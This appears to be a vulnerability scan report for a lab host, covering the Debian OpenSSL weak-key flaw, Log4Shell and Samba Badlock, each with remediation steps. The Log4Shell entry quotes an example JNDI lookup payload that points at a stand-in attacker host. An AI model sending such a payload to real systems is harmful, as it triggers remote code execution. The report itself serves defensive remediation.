Vulnerability Catalog — Critical & High Severity

Critical Debian OpenSSH/OpenSSL Package Randomness Weakness CVSS 10.0
AttributeValue
Port / Protocol2222/tcp (SSH)
CVSS v3 Score10.0 *
VPR Score5.1
EPSS0.0165
Nessus FamilyGain a Shell Remotely
Count1

Description: The Debian-packaged version of OpenSSL had a critically flawed random number generator introduced by a Debian-specific patch. This caused SSH and SSL keys generated on the system to be drawn from an extremely small set of predictable values, making brute-force of private keys trivially easy. This is one of the most severe known cryptographic vulnerabilities in Debian/Ubuntu history.

Impact: An attacker can enumerate the limited keyspace offline and then authenticate to the SSH service without valid credentials, achieving full remote shell access.

Remediation: Regenerate all SSH host keys and user keys. Update the openssl and openssh-server packages to their current versions. Revoke and reissue any SSL certificates generated on the affected system.

Critical Apache Log4j Remote Code Execution (Log4Shell) — Multiple Issues CVE-2021-44228
AttributeValue
Port / Protocol8082/tcp (HTTP / Log4Shell container)
CVSS v3 Score10.0
Nessus FamilyWeb Servers
Count2

Description: Apache Log4j versions 2.0-beta9 through 2.14.1 allow remote code execution through crafted log messages containing JNDI lookup strings. When a user-controlled string such as ${jndi:ldap://attacker.com/a} is passed to the logger, Log4j performs an outbound LDAP lookup and executes the returned Java class. The application running on port 8082 (ghcr.io/christophetd/log4shell-vulnerable-app) is purpose-built to demonstrate this flaw.

Impact: Immediate, unauthenticated Remote Code Execution (RCE) as the process user. Attackers can establish reverse shells, deploy malware, or pivot to internal systems.

Remediation: Update Log4j to version 2.17.1 or later immediately. As a short-term mitigation, set the JVM property log4j2.formatMsgNoLookups=true or remove the JndiLookup class from the classpath.

High Samba Badlock Vulnerability CVE-2016-2118 / CVE-2016-0128
AttributeValue
Port / Protocol139/tcp, 445/tcp (SMB/NetBIOS)
CVSS v3 Score7.5
VPR Score5.9
EPSS0.7852 (78.5% exploitation probability)
Nessus FamilyGeneral
Samba Version DetectedSamba 3.0.20-Debian
Count1

Description: The Badlock vulnerability in Samba allows a man-in-the-middle attacker to intercept and downgrade DCERPC connections between a client and a domain controller, potentially gaining unauthorized access to SAM database contents or performing NTLM relay attacks. The EPSS score of 0.7852 indicates a very high real-world exploitation probability.

Impact: An attacker on the same network segment can intercept SMB authentication, obtain password hashes, and relay credentials to gain access to other services. The running version (Samba 3.0.20) is far beyond end-of-life and contains many additional known vulnerabilities.

Remediation: Upgrade Samba to version 4.4.2 or later. Disable SMBv1 and NetBIOS entirely. Enforce SMB signing. Restrict ports 139 and 445 to required hosts via firewall rules.
